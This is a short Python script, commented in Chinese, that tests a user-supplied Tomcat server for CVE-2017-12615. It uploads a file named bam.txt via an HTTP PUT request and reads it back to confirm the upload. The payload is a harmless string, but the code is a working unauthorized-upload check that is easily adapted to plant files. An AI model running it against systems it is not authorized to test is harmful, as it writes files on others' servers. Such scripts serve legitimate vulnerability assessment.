import requests
import re

# 攻击载荷模块
def payloads():
    payload = '123456'
    return payload

# 发送载荷模块
def send_payload(url, payload):
    # proxy = {
    #     'http': '127.0.0.1:8080',
    #     'https': '127.0.0.1:8080'
    # }
    headers = {
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded',
    }
    try:
        requests.put(url + '/', headers=headers, data=payload, verify=False)
        response = requests.get(url, headers=headers, data=payload, verify=False)
    except Exception:
        pass
    return response

# 检验载荷模块
def chech_payload(response, payload):
    if payload in response.text:
        print('[+] 存在CVE-2017-12615漏洞，上传文件成功，url:{} '.format(url))
    
def main(url):
    payload = payloads()
    response = send_payload(url, payload)
    chech_payload(response, payload)

url = str(input('[+] 请输入url，格式为http://ip:port ')) + '/bam.txt'
main(url)
print('[+] Tomcat文件上传漏洞检测完毕')

    
